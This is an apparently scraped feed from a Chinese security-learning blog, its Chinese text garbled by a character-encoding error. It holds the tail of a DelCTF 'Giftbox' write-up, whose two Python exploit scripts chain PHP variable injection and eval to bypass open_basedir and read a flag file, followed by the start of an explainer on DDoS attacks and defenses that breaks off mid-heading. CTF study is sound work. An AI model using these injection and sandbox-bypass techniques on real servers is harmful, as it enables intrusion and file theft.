data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/giftbox_12_2.png" class="lazyload"></a></p><p><strong><font color="6495ED">position</font></strong> é•¿åº¦é™åˆ¶12ä½ï¼ŒåŒæ ·éƒ½å­˜åœ¨ <code>\</code> çš„è¿‡æ»¤(å…¶å®ä¹Ÿç®€å•ï¼Œç”¨ <code>chr()</code> ç»•è¿‡)</p><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/giftbox_12_3.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/giftbox_12_3.png" class="lazyload"></a></p><p>æ€»ç»“ä¸€ä¸‹è¿è¡Œè¿‡ç¨‹</p><ul><li><font color="6495ED">targeting code position</font> -&gt; å‚¨å­˜ä¸€æ¡ <code>$code = &quot;position&quot;</code>;</li><li><font color="6495ED">launch</font> -&gt; å°†ä¸Šé¢ <code>targeting</code> çš„ <code>code</code>  æŒ‰ç…§å­—å…¸é¡ºåºè·‘ä¸€é</li><li><font color="6495ED">destuct</font> -&gt; å…¨éƒ¨æ¸…ç©ºï¼Œæ¢å¤åˆå§‹çŠ¶æ€</li></ul><p>ç„¶åæŒ‰ç…§ä¸Šé¢ <a href="https://xz.aliyun.com/t/4720" target="_blank" rel="noopener">open_basedirç»•è¿‡</a></p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chdir(<span class="string">'img'</span>);ini_set(<span class="string">'open_basedir'</span>,<span class="string">'..'</span>);chdir(<span class="string">'..'</span>);chdir(<span class="string">'..'</span>);chdir(<span class="string">'..'</span>);chdir(<span class="string">'..'</span>);ini_set(<span class="string">'open_basedir'</span>,<span class="string">'/'</span>);<span class="keyword">echo</span>(file_get_contents(<span class="string">'flag'</span>));</span><br></pre></td></tr></table></figure></div><h2 id="æœ€åexp"><a href="#æœ€åexp" class="headerlink" title="æœ€åexp"></a>æœ€åexp</h2><h3 id="exp1"><a href="#exp1" class="headerlink" title="exp1"></a>exp1</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> pyotp <span class="keyword">as</span> pyotp</span><br><span class="line"></span><br><span class="line">totp = pyotp.TOTP(<span class="string">'GAXG24JTMZXGKZBU'</span>, <span class="number">8</span>, interval=<span class="number">5</span>)</span><br><span class="line">session = requests.session()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">()</span>:</span></span><br><span class="line">    time.sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line">    r = session.get(<span class="string">'http://link-site/shell.php'</span>,</span><br><span class="line">                    params=&#123;<span class="string">'a'</span>: <span class="string">'login admin hint&#123;G1ve_u_hi33en_C0mm3nd-sh0w_hiiintttt_23333&#125;'</span>, <span class="string">'totp'</span>: totp.now()&#125;)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> r.json()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">targeting</span><span class="params">(code, position)</span>:</span></span><br><span class="line">    time.sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line">    r = session.get(<span class="string">'http://link-site/shell.php'</span>, params=&#123;<span class="string">'a'</span>: <span class="string">'targeting '</span> + code + <span class="string">' '</span> + position, <span class="string">'totp'</span>: totp.now()&#125;)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> r.json()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">launch</span><span class="params">()</span>:</span></span><br><span class="line">    time.sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line">    r = session.get(<span class="string">'http://link-site/shell.php'</span>, params=&#123;<span class="string">'a'</span>: <span class="string">'launch'</span>, <span class="string">'totp'</span>: totp.now()&#125;)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> r.text</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">destuct</span><span class="params">()</span>:</span></span><br><span class="line">    time.sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line">    r = session.get(<span class="string">'http://link-site/shell.php'</span>, params=&#123;<span class="string">'a'</span>: <span class="string">'destruct'</span>, <span class="string">'totp'</span>: totp.now()&#125;)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> r.json()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    login()</span><br><span class="line">    destuct()</span><br><span class="line">    targeting(<span class="string">"a"</span>, <span class="string">"chdir"</span>)</span><br><span class="line">    targeting(<span class="string">"b"</span>, <span class="string">"img"</span>)</span><br><span class="line">    targeting(<span class="string">"c"</span>, <span class="string">"&#123;$a($b)&#125;"</span>)</span><br><span class="line"></span><br><span class="line">    targeting(<span class="string">"d"</span>, <span class="string">"ini_set"</span>)</span><br><span class="line">    targeting(<span class="string">"e"</span>, <span class="string">"open_basedir"</span>)</span><br><span class="line">    targeting(<span class="string">"f"</span>, <span class="string">".."</span>)</span><br><span class="line">    targeting(<span class="string">"g"</span>, <span class="string">"&#123;$d($e,$f)&#125;"</span>)</span><br><span class="line"></span><br><span class="line">    targeting(<span class="string">"h"</span>, <span class="string">"&#123;$a($f)&#125;"</span>)</span><br><span class="line">    targeting(<span class="string">"i"</span>, <span class="string">"&#123;$a($f)&#125;"</span>)</span><br><span class="line"></span><br><span class="line">    targeting(<span class="string">"j"</span>, <span class="string">"Ly8v"</span>)</span><br><span class="line">    targeting(<span class="string">"k"</span>, <span class="string">"base64_"</span>)</span><br><span class="line">    targeting(<span class="string">"l"</span>, <span class="string">"decode"</span>)</span><br><span class="line">    targeting(<span class="string">"m"</span>, <span class="string">"$k$l"</span>)</span><br><span class="line">    targeting(<span class="string">"n"</span>, <span class="string">"&#123;$m($j)&#125;"</span>)</span><br><span class="line">    targeting(<span class="string">"o"</span>, <span class="string">"&#123;$d($e,$n)&#125;"</span>)</span><br><span class="line"></span><br><span class="line">    targeting(<span class="string">"p"</span>, <span class="string">"flag"</span>)</span><br><span class="line">    targeting(<span class="string">"q"</span>, <span class="string">"file_get"</span>)</span><br><span class="line">    targeting(<span class="string">"r"</span>, <span class="string">"_contents"</span>)</span><br><span class="line">    targeting(<span class="string">"s"</span>, <span class="string">"$q$r"</span>)</span><br><span class="line"></span><br><span class="line">    targeting(<span class="string">"t"</span>, <span class="string">"&#123;$s($p)&#125;"</span>)</span><br><span class="line"></span><br><span class="line">    print(launch())</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure></div><h3 id="exp2"><a href="#exp2" class="headerlink" title="exp2"></a>exp2</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pyotp</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">totp=pyotp.TOTP(<span class="string">'GAXG24JTMZXGKZBU'</span>,digits=<span class="number">8</span>,interval=<span class="number">5</span>)</span><br><span class="line">url=<span class="string">'http://link-site/shell.php'</span></span><br><span class="line">s=requests.session()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">()</span>:</span></span><br><span class="line">    params=&#123;</span><br><span class="line">        <span class="string">'a'</span>:<span class="string">'login admin hint&#123;G1ve_u_hi33en_C0mm3nd-sh0w_hiiintttt_23333&#125;'</span>,</span><br><span class="line">        <span class="string">'totp'</span>:totp.now()</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> s.get(url,params=params)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">destruct</span><span class="params">()</span>:</span></span><br><span class="line">    params = &#123;</span><br><span class="line">        <span class="string">'a'</span>: <span class="string">'destruct'</span>,</span><br><span class="line">        <span class="string">'totp'</span>: totp.now()</span><br><span class="line">    &#125;</span><br><span class="line">    s.get(url, params=params)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">launch</span><span class="params">()</span>:</span></span><br><span class="line">    params = &#123;</span><br><span class="line">        <span class="string">'a'</span>: <span class="string">'launch'</span>,</span><br><span class="line">        <span class="string">'totp'</span>: totp.now(),</span><br><span class="line">        <span class="comment">#'w':'''print_r(scandir('.'));'''</span></span><br><span class="line">        <span class="comment">#imgæ˜¯å½“å‰ç›®å½•çš„ä¸€ä¸ªæ–‡ä»¶å¤¹ï¼Œä¹Ÿå¯ä»¥æ”¹ä¸ºå…¶ä»–å½“å‰ç›®å½•æ–‡ä»¶å¤¹</span></span><br><span class="line">        <span class="string">'w'</span>: <span class="string">'''chdir('img');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');readfile('/flag');'''</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> s.get(url, params=params)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">targeting</span><span class="params">(code,pos)</span>:</span></span><br><span class="line">    params = &#123;</span><br><span class="line">        <span class="string">'a'</span>: <span class="string">'targeting &#123;&#125; &#123;&#125;'</span>.format(code,pos),</span><br><span class="line">        <span class="string">'totp'</span>: totp.now()</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> s.get(url, params=params)</span><br><span class="line">print(login().text)</span><br><span class="line"><span class="comment">###phpinfoæµ‹è¯•</span></span><br><span class="line"><span class="comment">#targeting('a','phpinfo')</span></span><br><span class="line"><span class="comment">#targeting('b','&#123;$a()&#125;')</span></span><br><span class="line"><span class="comment">#print(launch().text)</span></span><br><span class="line">destruct()</span><br><span class="line">targeting(<span class="string">'a'</span>,<span class="string">'&#123;$_GET&#123;w&#125;&#125;'</span>)</span><br><span class="line">targeting(<span class="string">'b'</span>,<span class="string">'$&#123;eval($a)&#125;'</span>)</span><br><span class="line">print(launch().text)</span><br></pre></td></tr></table></figure></div><h1 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h1><p><a href="https://github.com/wuyanxin/totp.js" target="_blank" rel="noopener">TOTPä½œè€…ç®—æ³•</a><br><a href="https://blog.csdn.net/chasingin/article/details/104642522/" target="_blank" rel="noopener">W4nderå¸ˆå‚…çš„wp</a><br><a href="https://xz.aliyun.com/t/5967" target="_blank" rel="noopener">æµ…æDelCTF webä¹‹Giftboxé¢˜è§£</a><br><a href="https://www.zhaoj.in/read-6170.html" target="_blank" rel="noopener">èµµæ€»çš„wp</a><br><a href="https://xz.aliyun.com/t/4785" target="_blank" rel="noopener">ä»ä¸€é“é¢˜è®²PHPå¤æ‚å˜é‡</a><br><a href="https://xz.aliyun.com/t/4720" target="_blank" rel="noopener">bypass open_basedirçš„æ–°æ–¹æ³•</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\yakko117\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\yakko117\assets\js\A
      
    
    </summary>
    
    
      <category term="å­¦ä¹ ç¬”è®°" scheme="https://manayakko.github.io/yakko117/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="ctf" scheme="https://manayakko.github.io/yakko117/tags/ctf/"/>
    
      <category term="write up" scheme="https://manayakko.github.io/yakko117/tags/write-up/"/>
    
  </entry>
  
  <entry>
    <title>DDoSåŸç†ä¸é˜²å¾¡</title>
    <link href="https://manayakko.github.io/yakko117/2020/03/29/Ddos%E5%AD%A6%E4%B9%A0/"/>
    <id>https://manayakko.github.io/yakko117/2020/03/29/Ddos%E5%AD%A6%E4%B9%A0/</id>
    <published>2020-03-29T11:18:13.841Z</published>
    <updated>2020-03-31T14:03:09.690Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\yakko117\assets\css\APlayer.min.css"><script src="\yakko117\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\yakko117\assets\js\Meting.min.js"></script><p>æ„Ÿè§‰è‡ªå·±æœ€è¿‘å¾ˆé¢“åºŸï¼Œå› ä¸ºä¸€ç‚¹å°äº‹å°±æƒ³ç€é€ƒé¿ï¼Œç„¶åæ‘¸é±¼æ‘¸ä¸€å¤©<br>ä¸ºä»€ä¹ˆè¦å†™è¿™ç¯‡ï¼Œä¸»è¦æ˜¯å› ä¸ºè€ƒè¯•è€ƒåˆ°äº†ï¼Œæ‰€ä»¥è®°å½•å­¦ä¹ ä¸€ä¸‹<br>                                â€“ æ‡’ç‹—å‘è¨€</p><h1 id="DDoSç®€ä»‹"><a href="#DDoSç®€ä»‹" class="headerlink" title="DDoSç®€ä»‹"></a>DDoSç®€ä»‹</h1><p><strong>DDoS(Distributed Denial of Service)</strong>ï¼Œåˆç§°åˆ†å¸ƒå¼æ‹’ç»æœåŠ¡æ”»å‡»ã€‚<br>é€šè¿‡æ§åˆ¶å¤šä¸ªè‚‰é¸¡æˆ–æœåŠ¡å™¨ç»„æˆçš„åƒµå°¸ç½‘ç»œï¼Œå¯¹ç›®æ ‡å‘é€å¤§é‡çœ‹ä¼¼åˆæ³•è¯·æ±‚ï¼Œä»è€Œå ç”¨å¤§é‡ç½‘ç»œèµ„æºï¼Œç˜«ç—ªç½‘ç»œï¼Œé˜»æ­¢ç”¨æˆ·å¯¹ç½‘ç»œèµ„æºoçš„æ­£å¸¸è®¿é—®ã€‚</p><h2 id="DDoSå±å®³"><a href="#DDoSå±å®³" class="headerlink" title="DDoSå±å®³"></a>DDoSå±å®³</h2><p>å‡ºå£å¸¦å®½å µæ­»<br>æ¸¸æˆæ‰çº¿å¯¼è‡´å®¢æˆ·æµå¤±<br>æœåŠ¡å™¨è¿æ¥æ•°å¤šï¼Œè¿æ¥èµ„æºè¢«è€—å°½<br>æœåŠ¡å™¨å¡ã€æ…¢ã€æ­»æœºã€æ— æ³•è¿æ¥</p><h2 id="æ”»å‡»æ¥æº"><a href="#æ”»å‡»æ¥æº" class="headerlink" title="æ”»å‡»æ¥æº"></a>æ”»å‡»æ¥æº</h2><p>é«˜æ€§èƒ½æœåŠ¡å™¨é…åˆå‘åŒ…è½¯ä»¶<br>å¯è”ç½‘çš„è®¾å¤‡(å¦‚æ‰“å°æœºã€æ‘„åƒå¤´ã€ç”µè§†ç­‰ç­‰)<br>ç§»åŠ¨è®¾å¤‡(æ•°é‡å¤šï¼Œå¢é•¿é€Ÿåº¦å¿«ï¼Œå…¶é«˜æ€§èƒ½åˆ©äºç»„å»ºåƒµå°¸ç½‘ç»œ)<br>ä¸ªäººPC(å­˜åœ¨æ¼æ´çš„PCæˆ–ä¸€äº›é»‘å®¢è¿·è‡ªæ„¿æˆä¸ºDDOSä¸€å‘˜)<br>éª‡å®¢æ§åˆ¶çš„åƒµå°¸ç½‘ç»œ(åƒµå°¸ç½‘ç»œåˆåˆ†ä¸ºIRCå‹ã€HTTPå‹ã€P2På‹)</p><h2 id="æµé‡ç‰¹ç‚¹"><a href="#æµé‡ç‰¹ç‚¹" class="headerlink" title="æµé‡ç‰¹ç‚¹"></a>æµé‡ç‰¹ç‚¹</h2><p>IPåœ°å€éšæœºæˆ–å›ºå®šæŸäº›IPæ®µéšæœº<br>æ²¡æœ‰å®Œæ•´å®Œæˆä¸‰æ¬¡æ¡æ‰‹<br>åœ°å€å¤šæ•°æ˜¯ä¼ªé€ çš„<br>è¯·æ±‚æ•°é‡å¤§ã€å¿«</p><h2 id="å¯¼è‡´DDoSåŸå› "><a href="#å¯¼è‡´DDoSåŸå› " class="headerlink" title="å¯¼è‡´DDoSåŸå› "></a>å¯¼è‡´DDoSåŸå› </h2><p>ä¸ªäººå› ç´ ï¼šé‡‘é’±åˆ©ç›Š æ”¿æ²»å†²çª å®—æ•™å†²çª ä¸ºæ±‚å‡ºå</p><p>æœåŠ¡å¸¦å®½ä¸Šé™ ç½‘ç»œåè®®å­˜åœ¨ç¼ºé™·<br>æœåŠ¡å™¨è®¾å¤‡æ€§èƒ½ä¸Šé™<br>åº”ç”¨æ€§èƒ½ä¸Šé™<br>ç³»ç»Ÿæ€§èƒ½ä¸Šé™</p><hr><h1 id="æ”»å‡»ç±»å‹åŠé˜²å¾¡"><a href="#æ”»å‡»ç±»å‹åŠé˜²å¾¡" class="headerlink" title="æ”»å‡»ç±»å‹åŠé˜²å¾¡"></a>æ”»å‡»ç±»å‹åŠé˜²å¾¡</h1><h2 id="Smurf-Attack"><a href="#Smurf-Attack" class="headerlink" title="Smurf Attack"></a>Smurf Attack</h2><p>æ”»å‡»è€…å‘ç½‘å…³å‘é€ <code>ICMPè¯·æ±‚åŒ…</code>ï¼Œå¹¶å°†è¯¥ <code>ICMPè¯·æ±‚æŠ¥æ–‡çš„æºåœ°å€</code> ä¼ªé€ æˆ <code>å—å®³ä¸»æœºIPåœ°å€</code>ï¼Œç›®çš„åœ°å€ä¸ºå¹¿æ’­åœ°å€ã€‚<br>è·¯ç”±å™¨åœ¨æ¥å—åˆ°è¯¥æ•°æ®åŒ…ï¼Œå‘ç°ç›®çš„åœ°å€æ˜¯<strong>å¹¿æ’­åœ°å€</strong>ï¼Œå°±ä¼šå°†è¯¥æ•°æ®åŒ…å¹¿æ’­å‡ºå»ï¼Œå±€åŸŸç½‘å†…æ‰€æœ‰çš„ <strong>å­˜æ´»ä¸»æœº</strong> éƒ½ä¼šå—åˆ°ä¸€ä¸ª <code>ICMPè¯·æ±‚åŒ…</code>ï¼Œ<strong>æºåœ°å€æ˜¯å—å®³ä¸»æœºIP</strong>ã€‚æ¥ä¸‹æ¥å—å®³ä¸»æœºå°±ä¼šæ”¶åˆ°è¯¥ç½‘ç»œå†…æ‰€æœ‰ä¸»æœºå‘æ¥çš„ <code>ICMPåº”ç­”æŠ¥æ–‡</code> ï¼Œé€šè¿‡å¤§é‡è¿”å›çš„ICMPåº”ç­”æŠ¥æ–‡æ¥æ·¹æ²¡å—å®³ä¸»æœºï¼Œæœ€ç»ˆå¯¼è‡´ç½‘ç»œé˜»å¡ï¼Œå—å®³ä¸»æœºå´©æºƒã€‚</p><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_1.png" data-fancybox="group" data-caption="ddos_1" class="fancybox"><img alt="ddos_1" title="ddos_1" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_1.png" class="lazyload"></a></p><p>é˜²æŠ¤æ–¹æ¡ˆï¼š</p><ul><li>ç¦æ­¢è·¯ç”±å™¨å¹¿æ’­ICMPè¯·æ±‚åŒ…ï¼›</li><li>ç¦æ­¢æ“ä½œç³»ç»Ÿå¯¹å¹¿æ’­å‘å‡ºçš„ICMPè¯·æ±‚åŒ…åšå‡ºå“åº”ï¼›</li><li>é…ç½®é˜²ç«å¢™é™æ­¢æ¥è‡ªä½ æ‰€å¤„ç½‘ç»œå¤–éƒ¨çš„pingåŒ…</li></ul><hr><h2 id="TearDrop-Attack"><a href="#TearDrop-Attack" class="headerlink" title="TearDrop Attack"></a>TearDrop Attack</h2><p>åœ¨äº†è§£è¿™ç§æ”»å‡»ä¹‹å‰ï¼Œéœ€è¦å…ˆçŸ¥é“ä»€ä¹ˆæ˜¯ <code>IP fragmentation(æ•°æ®åŒ…åˆ†ç‰‡)</code>ã€‚æ•°æ®åœ¨ç½‘ç»œä¸­ä¼ è¾“å¿…å®šä¼šäº§ç”Ÿæ•°æ®åŒ…è¢«åˆ†ç‰‡ï¼Œå› ä¸ºæ¯ç§ç½‘ç»œéƒ½æœ‰ä¸åŒçš„æœ€å¤§å•ä¸ªæ•°æ®åŒ…çš„å¤§å°ï¼Œä¹Ÿå°±æ˜¯å¸¸è¯´çš„ <code>MTU (Maximum Transmission Unitï¼Œæœ€å¤§ä¼ è¾“å•å…ƒ)</code>ã€‚å½“è¦ä¼ è¾“çš„æ•°æ®è¶…è¿‡ä½ è¦é€šä¿¡çš„é‚£å°ä¸»æœºæ‰€å¤„ç½‘ç»œçš„MTUæ—¶ï¼Œæ•°æ®åŒ…å°±ä¼šè¢«åˆ†ç‰‡è¿›è¡Œä¼ è¾“ï¼Œç„¶ååœ¨åˆ°è¾¾ç›®çš„åœ°å†é‡æ–°ç»„è£…æˆåŸæ¥çš„æ•°æ®åŒ…ï¼Œä¸‹é¢æ˜¯æ•°æ®åŒ…åˆ†ç‰‡é‡ç»„è¿‡ç¨‹</p><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_2.png" data-fancybox="group" data-caption="ddos_2" class="fancybox"><img alt="ddos_2" title="ddos_2" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_2.png" class="lazyload"></a></p><p><code>TearDrop Attack</code>ï¼Œå°±æ˜¯é€šè¿‡è®¾ç½®é”™è¯¯çš„ç‰‡åç§»ï¼Œä½¿å¾—æ•°æ®åŒ…åˆ°è¾¾ç›®çš„åœ°æ—¶ï¼ŒæœåŠ¡å™¨æ— æ³•é‡æ–°ç»„åˆæ•°æ®åŒ…ï¼Œå› ä¸ºæ•°æ®åŒ…çš„ç»„åˆæ˜¯é€šè¿‡ç‰‡åç§»æ¥ç»„è£…çš„ï¼Œæœ€ç»ˆå¯¼è‡´å´©æºƒã€‚</p><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_3.png" data-fancybox="group" data-caption="ddos_3" class="fancybox"><img alt="ddos_3" title="ddos_3" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_3.png" class="lazyload"></a></p><p>å¯¹æ¯”ä¸€ä¸‹æ­£å¸¸IPæ•°æ®åŒ…å’Œé”™è¯¯IPæ•°æ®åŒ…</p><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_4.png" data-fancybox="group" data-caption="ddos_4" class="fancybox"><img alt="ddos_4" title="ddos_4" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_4.png" class="lazyload"></a></p><p>è¿™ç§æ”»å‡»ä¸»è¦å¯¹æ—§çš„windowsç‰ˆæœ¬å’ŒLinuxç‰ˆæœ¬æœ‰æ•ˆï¼Œé˜²æŠ¤çš„è¯ï¼Œå¯ä»¥æ£€æµ‹å‘æ¥çš„æ•°æ®åŒ…ç‰‡åç§»æ˜¯å¦åˆæ³•ï¼Œå¦‚æœåˆæ³•åœ¨ç»„è£…ï¼Œä¸åˆæ³•ç›´æ¥ä¸¢å¼ƒã€‚ä¾‹å¦‚è¿™ä¸ªï¼š<a href="https://wenku.baidu.com/view/b45bba61ddccda38376baf7f.html" target="_blank" rel="noopener">åˆ†ç‰‡é‡ç»„æ£€æŸ¥ç®—æ³• &lt;- link</a>ã€‚</p><p>ç½‘ç»œå®‰å…¨è®¾å¤‡å°†æ¥æ”¶åˆ°çš„<strong>åˆ†ç‰‡æŠ¥æ–‡</strong>å…ˆæ”¾å…¥<strong>ç¼“å­˜</strong>ä¸­ï¼Œå¹¶æ ¹æ®<strong>æºIPåœ°å€</strong>å’Œ<strong>ç›®çš„IPåœ°å€</strong>å¯¹æŠ¥æ–‡è¿›è¡Œåˆ†ç»„ï¼ŒæºIPåœ°å€å’Œç›®çš„IPåœ°å€å‡ç›¸åŒçš„æŠ¥æ–‡å½’å…¥åŒä¸€ç»„ï¼Œç„¶åå¯¹æ¯ç»„IPæŠ¥æ–‡çš„ç›¸å…³åˆ†ç‰‡ä¿¡æ¯è¿›è¡Œæ£€æŸ¥ï¼Œ<strong>ä¸¢å¼ƒåˆ†ç‰‡ä¿¡æ¯å­˜åœ¨é”™è¯¯çš„æŠ¥æ–‡</strong>ã€‚ä¸ºäº†é˜²æ­¢ç¼“å­˜ç›Šå¤„ï¼Œå½“ç¼“å­˜å¿«è¦å­˜æ»¡æ˜¯ï¼Œç›´æ¥ä¸¢å¼ƒåç»­åˆ†ç‰‡æŠ¥æ–‡ã€‚</p><hr><h2 id="Land-Attack"><a href="#Land-Attack" class="headerlink" title="Land Attack"></a>Land Attack</h2><p>æ”»å‡»è€…å‘åŠ¨ <code>Land Attack</code> æ”»å‡»æ—¶ï¼Œéœ€è¦å…ˆå‘å‡ºä¸€ä¸ªSYNæ•°æ®åŒ…ï¼Œå¹¶å°†æ•°æ®åŒ…çš„æºIPä¸ç›®çš„IPéƒ½è®¾ç½®æˆè¦æ”»å‡»çš„ç›®æ ‡IPï¼Œè¿™æ ·ç›®æ ‡åœ¨æ¥æ”¶åˆ°SYNæ•°æ®åŒ…åï¼Œä¼šæ ¹æ®æºIPå›åº”ä¸€ä¸ªSYN+ACKæ•°æ®åŒ…ï¼Œå³å’Œè‡ªå·±å»ºç«‹ä¸€ä¸ªç©ºè¿æ¥ï¼Œç„¶ååˆ°è¾¾idelè¶…æ—¶æ—¶é—´æ—¶ï¼Œæ‰ä¼šé‡Šæ”¾è¿™ä¸ªè¿æ¥ã€‚æ”»å‡»è€…å‘é€å¤§é‡è¿™æ ·çš„æ•°æ®åŒ…ï¼Œä»è€Œè€—å°½ç›®æ ‡çš„TCPè¿æ¥æ± ï¼Œæœ€ç»ˆå¯¼è‡´æ‹’ç»æœåŠ¡ã€‚æ”»å‡»è¿‡ç¨‹å¦‚ä¸‹</p><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_5.png" data-fancybox="group" data-caption="ddos_5" class="fancybox"><img alt="ddos_5" title="ddos_5" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_5.png" class="lazyload"></a></p><p><strong>é˜²å¾¡æ–¹æ¡ˆ</strong>:</p><ul><li>é€šè¿‡<strong>è®¾ç½®é˜²ç«å¢™å’Œè·¯ç”±è§„åˆ™</strong>ï¼Œæ£€æµ‹æºIPä¸ç›®çš„IPç›¸åŒçš„æ•°æ®åŒ…ï¼Œä¸¢å¼ƒã€è¿‡æ»¤è¿™ç§æ•°æ®åŒ…ã€‚(ç±»ä¼¼ä¸Šè¿°çš„ <font color="6495ED">TearDrop Attack</font>)</li></ul><hr><h2 id="SYN-flood-attack-å‡ ä¸ªå€¼å¾—äº†è§£çš„å…³é”®ç‚¹æ¥äº†"><a href="#SYN-flood-attack-å‡ ä¸ªå€¼å¾—äº†è§£çš„å…³é”®ç‚¹æ¥äº†" class="headerlink" title="SYN 